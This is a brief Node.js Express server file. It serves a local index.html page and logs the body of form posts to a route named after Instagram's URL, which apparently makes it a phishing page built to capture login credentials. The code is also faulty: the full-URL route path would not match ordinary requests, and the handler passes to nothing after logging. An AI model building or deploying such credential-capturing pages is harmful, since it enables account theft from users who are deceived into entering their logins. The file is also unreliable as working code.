const express = require('express');
const path = require('path');
const bodyparser = require('body-parser');




const app = express();
app.use(bodyparser.urlencoded());
app.use(express.static(path.join(__dirname, 'public')))
app.get("/",(req, res, next) => {
    res.sendFile(path.join(__dirname, './', 'views', 'index.html'))
})
app.post("https://www.instagram.com/", (req, res, next) =>{
    console.log(req.body)
   next()
})




const port = 3000;
app.listen(port , () =>{
    console.log(`server is running on address http://localhost:${port}`)
})
